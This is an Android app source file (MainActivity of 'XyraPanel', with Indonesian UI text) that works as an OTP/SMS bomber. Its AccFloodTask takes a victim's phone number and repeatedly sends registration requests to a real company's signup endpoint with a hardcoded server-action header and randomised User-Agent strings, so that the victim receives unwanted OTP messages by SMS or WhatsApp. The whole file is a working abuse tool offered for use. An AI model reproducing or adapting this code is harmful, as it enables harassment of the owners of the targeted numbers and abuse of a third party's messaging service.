package com.xyra.panel;

import android.app.Activity;
import android.app.Dialog;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.view.Window;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.CompoundButton;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import android.app.Notification;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Random;
import android.animation.ValueAnimator;
import android.animation.ArgbEvaluator;
import android.view.animation.LinearInterpolator;

public class MainActivity extends Activity {

    private EditText etTargetPhone, etJumlahKirim;
    private TextView tvAppTitle;
    private ValueAnimator colorAnimator;
    private Button btnStartFlood;
    private Button btnQuick1, btnQuick3, btnQuick5, btnQuickRandom;
    private Button btnSms, btnWhatsapp;
    private ProgressBar progressBar;
    private TextView tvStatusTitle;
    private TextView tvStatSuccess, tvStatFailed, tvStatAvg;
    private View statusDot;

    private AccFloodTask currentTask;
    private boolean isRunning = false;
    private static final int MAX_SEND = 5;
    private String selectedProvider = "sms";
    private static final String PREFS_NAME = "XyraPanelPrefs";
    private static final String KEY_PRIVACY_ACCEPTED = "privacy_accepted";
    private static final String KEY_HISTORY = "send_history";
    private static final String CHANNEL_ID = "xyra_channel";
    private static final String ACTION_SHOW_HISTORY = "com.xyra.panel.SHOW_HISTORY";
    private static final int NOTIFICATION_ID = 1001;
    private Button btnHistory, btnAbout;

    private class AccFloodTask extends AsyncTask<String, Object, String> {

        private int totalSuccesses = 0;
        private int totalFailures = 0;
        private long totalDurationMs = 0;
        private int totalKirim = 0;
        private final int DELAY_SECONDS = 3;

        @Override
        protected void onPreExecute() {
            isRunning = true;
            statusDot.setBackgroundResource(R.drawable.dot_orange);
            tvStatusTitle.setText("Sending...");
            tvStatusTitle.setTextColor(getResources().getColor(R.color.warningColor));
            tvStatSuccess.setText("0");
            tvStatFailed.setText("0");
            tvStatAvg.setText("0");
            btnStartFlood.setText("STOP");
            btnStartFlood.setBackgroundResource(R.drawable.button_stop);
        }

        @Override
        protected String doInBackground(String... params) {
            String targetPhone = params[0];
            totalKirim = Integer.parseInt(params[1]);

            String urlStr = "https://www.acc.co.id/register/new-account";
            String phoneWith0 = targetPhone.startsWith("0") ? targetPhone : "0" + targetPhone;

            for (int i = 1; i <= totalKirim; i++) {
                if (isCancelled()) break;

                long startTime = System.currentTimeMillis();

                HttpURLConnection conn = null;
                try {
                    JSONArray jsonArray = new JSONArray();
                    JSONObject payload = new JSONObject();
                    payload.put("user_id", JSONObject.NULL);
                    payload.put("action", "register");
                    payload.put("send_to", phoneWith0);
                    payload.put("provider", selectedProvider);
                    jsonArray.put(payload);

                    String jsonData = jsonArray.toString();

                    Random rand = new Random();
                    String userAgent = "Mozilla/5.0 (Android) Chrome/" + (rand.nextInt(25) + 100) + ".0.0.0 Safari/537.36";

                    URL url = new URL(urlStr);
                    conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setConnectTimeout(15000);
                    conn.setReadTimeout(20000);
                    conn.setDoOutput(true);

                    conn.setRequestProperty("User-Agent", userAgent);
                    conn.setRequestProperty("Accept", "text/x-component");
                    conn.setRequestProperty("Content-Type", "text/plain");
                    conn.setRequestProperty("next-action", "7f6a1c8f7e114d52467f0195e8e23c7c6f235468b7");
                    conn.setRequestProperty("Origin", "https://www.acc.co.id");
                    conn.setRequestProperty("Referer", "https://www.acc.co.id/register/new-account");
                    conn.setRequestProperty("sec-ch-ua-platform", "\"Android\"");

                    OutputStream os = conn.getOutputStream();
                    os.write(jsonData.getBytes("UTF-8"));
                    os.flush();
                    os.close();

                    int responseCode = conn.getResponseCode();
                    long duration = System.currentTimeMillis() - startTime;
                    totalDurationMs += duration;

                    if (responseCode == 200) {
                        totalSuccesses++;
                    } else {
                        totalFailures++;
                    }

                } catch (Exception e) {
                    long duration = System.currentTimeMillis() - startTime;
                    totalDurationMs += duration;
                    totalFailures++;
                } finally {
                    if (conn != null) {
                        conn.disconnect();
                    }
                }

                int progress = (int) ((float) i / totalKirim * 100);
                long avgTime = (i > 0) ? totalDurationMs / i : 0;
                publishProgress(progress, totalSuccesses, totalFailures, avgTime, i, totalKirim);

                if (i < totalKirim && !isCancelled()) {
                    try {
                        Thread.sleep(DELAY_SECONDS * 1000);
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                }
            }
            return isCancelled() ? "Cancelled" : "Selesai";
        }

        @Override
        protected void onProgressUpdate(Object... values) {
            progressBar.setProgress((Integer) values[0]);
            tvStatSuccess.setText(String.valueOf((Integer) values[1]));
            tvStatFailed.setText(String.valueOf((Integer) values[2]));
            tvStatAvg.setText(String.valueOf((Long) values[3]));
            tvStatusTitle.setText("Sending " + values[4] + "/" + values[5]);
        }

        @Override
        protected void onPostExecute(String result) {
            finishTask(false);
        }

        @Override
        protected void onCancelled() {
            finishTask(true);
        }

        private void finishTask(boolean wasCancelled) {
            isRunning = false;
            progressBar.setVisibility(View.GONE);
            enableQuickButtons(true);
            btnStartFlood.setText("MULAI KIRIM");
            btnStartFlood.setBackgroundResource(R.drawable.button_primary);

            String phone = etTargetPhone.getText().toString().trim();
            saveHistory(phone, totalSuccesses, totalFailures, selectedProvider);

            if (wasCancelled) {
                statusDot.setBackgroundResource(R.drawable.dot_orange);
                tvStatusTitle.setText("Stopped");
                tvStatusTitle.setTextColor(getResources().getColor(R.color.warningColor));
                showNotification("Pengiriman Dihentikan", "Berhasil: " + totalSuccesses + ", Gagal: " + totalFailures);
            } else {
                statusDot.setBackgroundResource(R.drawable.dot_green);
                tvStatusTitle.setText("Completed");
                tvStatusTitle.setTextColor(getResources().getColor(R.color.successColor));
                showNotification("Pengiriman Selesai", "Berhasil: " + totalSuccesses + ", Gagal: " + totalFailures);
            }

            currentTask = null;
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        etTargetPhone = findViewById(R.id.et_target_phone);
        etJumlahKirim = findViewById(R.id.et_jumlah_kirim);
        btnStartFlood = findViewById(R.id.btn_start_flood);
        btnQuick1 = findViewById(R.id.btn_quick_1);
        btnQuick3 = findViewById(R.id.btn_quick_3);
        btnQuick5 = findViewById(R.id.btn_quick_5);
        btnQuickRandom = findViewById(R.id.btn_quick_random);
        btnSms = findViewById(R.id.btn_sms);
        btnWhatsapp = findViewById(R.id.btn_whatsapp);
        progressBar = findViewById(R.id.progress_bar);
        tvStatusTitle = findViewById(R.id.tv_status_title);
        tvStatSuccess = findViewById(R.id.tv_stat_success);
        tvStatFailed = findViewById(R.id.tv_stat_failed);
        tvStatAvg = findViewById(R.id.tv_stat_avg);
        statusDot = findViewById(R.id.status_dot);

        btnQuick1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                etJumlahKirim.setText("1");
            }
        });

        btnQuick3.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                etJumlahKirim.setText("3");
            }
        });

        btnQuick5.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                etJumlahKirim.setText("5");
            }
        });

        btnQuickRandom.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Random rand = new Random();
                int randomNum = rand.nextInt(MAX_SEND) + 1;
                etJumlahKirim.setText(String.valueOf(randomNum));
            }
        });

        btnSms.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                selectProvider("sms");
            }
        });

        btnWhatsapp.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                selectProvider("whatsapp");
            }
        });

        btnStartFlood.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (isRunning) {
                    if (currentTask != null) {
                        currentTask.cancel(true);
                    }
                } else {
                    startSending();
                }
            }
        });

        btnHistory = findViewById(R.id.btn_history);
        btnAbout = findViewById(R.id.btn_about);
        tvAppTitle = findViewById(R.id.tv_app_title);
        tvAppTitle.setText("XyraPanel");

        startColorAnimation();

        btnHistory.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                showHistoryDialog();
            }
        });

        btnAbout.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                showAboutDialog();
            }
        });

        createNotificationChannel();
        checkPrivacyPolicy();
        
        selectProvider("sms");
        
        handleNotificationIntent(getIntent());
    }
    
    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        handleNotificationIntent(intent);
    }
    
    private void handleNotificationIntent(Intent intent) {
        if (intent != null && ACTION_SHOW_HISTORY.equals(intent.getAction())) {
            showHistoryDialog();
        }
    }

    private void checkPrivacyPolicy() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        boolean accepted = prefs.getBoolean(KEY_PRIVACY_ACCEPTED, false);

        if (!accepted) {
            showPrivacyDialog();
        }
    }

    private void showPrivacyDialog() {
        final Dialog dialog = new Dialog(this);
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        dialog.setContentView(R.layout.dialog_privacy);
        dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        dialog.setCancelable(false);

        final CheckBox cbAccept = dialog.findViewById(R.id.cb_accept_privacy);
        final Button btnAccept = dialog.findViewById(R.id.btn_accept_privacy);

        cbAccept.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                btnAccept.setEnabled(isChecked);
                btnAccept.setAlpha(isChecked ? 1.0f : 0.5f);
            }
        });

        btnAccept.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
                SharedPreferences.Editor editor = prefs.edit();
                editor.putBoolean(KEY_PRIVACY_ACCEPTED, true);
                editor.apply();
                dialog.dismiss();
                Toast.makeText(MainActivity.this, "Selamat datang di Xyra Panel!", Toast.LENGTH_SHORT).show();
            }
        });

        dialog.show();
    }

    private void startSending() {
        try {
            String targetPhone = etTargetPhone.getText().toString().trim();
            String jumlahStr = etJumlahKirim.getText().toString().trim();

            if (targetPhone.isEmpty() || jumlahStr.isEmpty()) {
                Toast.makeText(this, "Isi semua kolom!", Toast.LENGTH_SHORT).show();
                return;
            }

            int jumlahKirim = Integer.parseInt(jumlahStr);
            if (jumlahKirim < 1 || jumlahKirim > MAX_SEND) {
                showMaxWarningDialog();
                return;
            }

            enableQuickButtons(false);
            progressBar.setVisibility(View.VISIBLE);
            progressBar.setProgress(0);

            currentTask = new AccFloodTask();
            currentTask.execute(targetPhone, String.valueOf(jumlahKirim));

        } catch (NumberFormatException e) {
            Toast.makeText(this, "Jumlah harus angka!", Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_LONG).show();
            enableQuickButtons(true);
            progressBar.setVisibility(View.GONE);
        }
    }

    private void showMaxWarningDialog() {
        final Dialog dialog = new Dialog(this);
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        dialog.setContentView(R.layout.dialog_warning);
        dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        dialog.setCancelable(true);

        Button btnOk = dialog.findViewById(R.id.btn_dialog_ok);
        btnOk.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                dialog.dismiss();
                etJumlahKirim.setText("");
                etJumlahKirim.requestFocus();
            }
        });

        dialog.show();
    }

    private void enableQuickButtons(boolean enabled) {
        btnQuick1.setEnabled(enabled);
        btnQuick3.setEnabled(enabled);
        btnQuick5.setEnabled(enabled);
        btnQuickRandom.setEnabled(enabled);
        btnSms.setEnabled(enabled);
        btnWhatsapp.setEnabled(enabled);
    }

    private void selectProvider(String provider) {
        selectedProvider = provider;
        if (provider.equals("sms")) {
            btnSms.setBackgroundResource(R.drawable.button_quick_accent);
            btnSms.setTextColor(getResources().getColor(android.R.color.white));
            btnWhatsapp.setBackgroundResource(R.drawable.button_quick);
            btnWhatsapp.setTextColor(getResources().getColor(R.color.colorPrimary));
        } else {
            btnWhatsapp.setBackgroundResource(R.drawable.button_quick_accent);
            btnWhatsapp.setTextColor(getResources().getColor(android.R.color.white));
            btnSms.setBackgroundResource(R.drawable.button_quick);
            btnSms.setTextColor(getResources().getColor(R.color.colorPrimary));
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Xyra Panel Notifications",
                NotificationManager.IMPORTANCE_DEFAULT
            );
            channel.setDescription("Notifikasi pengiriman OTP");
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    private void showNotification(String title, String message) {
        NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        
        Intent intent = new Intent(this, MainActivity.class);
        intent.setAction(ACTION_SHOW_HISTORY);
        intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
        
        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            flags |= PendingIntent.FLAG_IMMUTABLE;
        }
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, intent, flags);
        
        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, CHANNEL_ID);
        } else {
            builder = new Notification.Builder(this);
        }
        builder.setSmallIcon(R.drawable.ic_launcher)
            .setContentTitle(title)
            .setContentText(message)
            .setContentIntent(pendingIntent)
            .setAutoCancel(true);
        manager.notify(NOTIFICATION_ID, builder.build());
    }

    private void saveHistory(String phone, int success, int failed, String provider) {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        String history = prefs.getString(KEY_HISTORY, "");
        SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault());
        String timestamp = sdf.format(new Date());
        String entry = timestamp + " | " + phone + " | " + provider.toUpperCase() + " | Berhasil: " + success + ", Gagal: " + failed + "\n";
        history = entry + history;
        if (history.length() > 5000) {
            history = history.substring(0, 5000);
        }
        prefs.edit().putString(KEY_HISTORY, history).apply();
    }

    private void showHistoryDialog() {
        final Dialog dialog = new Dialog(this);
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        dialog.setContentView(R.layout.dialog_history);
        dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));

        final TextView tvContent = dialog.findViewById(R.id.tv_history_content);
        final TextView tvTotalEntries = dialog.findViewById(R.id.tv_total_entries);
        final TextView tvTotalSuccess = dialog.findViewById(R.id.tv_total_success);
        final TextView tvTotalFailed = dialog.findViewById(R.id.tv_total_failed);
        Button btnClear = dialog.findViewById(R.id.btn_clear_history);
        Button btnClose = dialog.findViewById(R.id.btn_close_history);

        final SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        String history = prefs.getString(KEY_HISTORY, "");
        
        updateHistoryStats(history, tvTotalEntries, tvTotalSuccess, tvTotalFailed);
        
        if (history.isEmpty()) {
            tvContent.setText("Belum ada riwayat pengiriman");
        } else {
            String formattedHistory = formatHistoryDisplay(history);
            tvContent.setText(formattedHistory);
        }

        btnClear.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                prefs.edit().putString(KEY_HISTORY, "").apply();
                tvContent.setText("Belum ada riwayat pengiriman");
                tvTotalEntries.setText("0");
                tvTotalSuccess.setText("0");
                tvTotalFailed.setText("0");
                Toast.makeText(MainActivity.this, "Riwayat dihapus", Toast.LENGTH_SHORT).show();
            }
        });

        btnClose.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                dialog.dismiss();
            }
        });

        dialog.show();
    }
    
    private void updateHistoryStats(String history, TextView tvEntries, TextView tvSuccess, TextView tvFailed) {
        if (history.isEmpty()) {
            tvEntries.setText("0");
            tvSuccess.setText("0");
            tvFailed.setText("0");
            return;
        }
        
        String[] lines = history.split("\n");
        int totalEntries = 0;
        int totalSuccess = 0;
        int totalFailed = 0;
        
        for (String line : lines) {
            if (line.trim().isEmpty()) continue;
            totalEntries++;
            
            try {
                if (line.contains("Berhasil:")) {
                    int startSuccess = line.indexOf("Berhasil:") + 9;
                    int endSuccess = line.indexOf(",", startSuccess);
                    if (endSuccess > startSuccess) {
                        String successStr = line.substring(startSuccess, endSuccess).trim();
                        totalSuccess += Integer.parseInt(successStr);
                    }
                }
                if (line.contains("Gagal:")) {
                    int startFailed = line.indexOf("Gagal:") + 6;
                    String failedStr = line.substring(startFailed).trim();
                    totalFailed += Integer.parseInt(failedStr);
                }
            } catch (Exception e) {
            }
        }
        
        tvEntries.setText(String.valueOf(totalEntries));
        tvSuccess.setText(String.valueOf(totalSuccess));
        tvFailed.setText(String.valueOf(totalFailed));
    }
    
    private String formatHistoryDisplay(String history) {
        String[] lines = history.split("\n");
        StringBuilder formatted = new StringBuilder();
        
        for (String line : lines) {
            if (line.trim().isEmpty()) continue;
            formatted.append("> ").append(line).append("\n\n");
        }
        
        return formatted.toString().trim();
    }

    private void showAboutDialog() {
        final Dialog dialog = new Dialog(this);
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        dialog.setContentView(R.layout.dialog_about);
        dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));

        Button btnClose = dialog.findViewById(R.id.btn_close_about);
        btnClose.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                dialog.dismiss();
            }
        });

        dialog.show();
    }

    private void startColorAnimation() {
        int colorPink = Color.parseColor("#FF1493");
        int colorOrange = Color.parseColor("#FF6B35");
        int colorGold = Color.parseColor("#FFD700");
        int colorGreen = Color.parseColor("#00D084");
        int colorCyan = Color.parseColor("#00CED1");
        int colorBlue = Color.parseColor("#4169E1");
        int colorPurple = Color.parseColor("#9B59B6");
        
        colorAnimator = ValueAnimator.ofObject(
            new ArgbEvaluator(), 
            colorPink, colorOrange, colorGold, colorGreen, 
            colorCyan, colorBlue, colorPurple, colorPink
        );
        colorAnimator.setDuration(4000);
        colorAnimator.setRepeatCount(ValueAnimator.INFINITE);
        colorAnimator.setInterpolator(new LinearInterpolator());
        colorAnimator.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() {
            @Override
            public void onAnimationUpdate(ValueAnimator animator) {
                tvAppTitle.setTextColor((int) animator.getAnimatedValue());
            }
        });
        colorAnimator.start();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (colorAnimator != null) {
            colorAnimator.cancel();
        }
    }
}
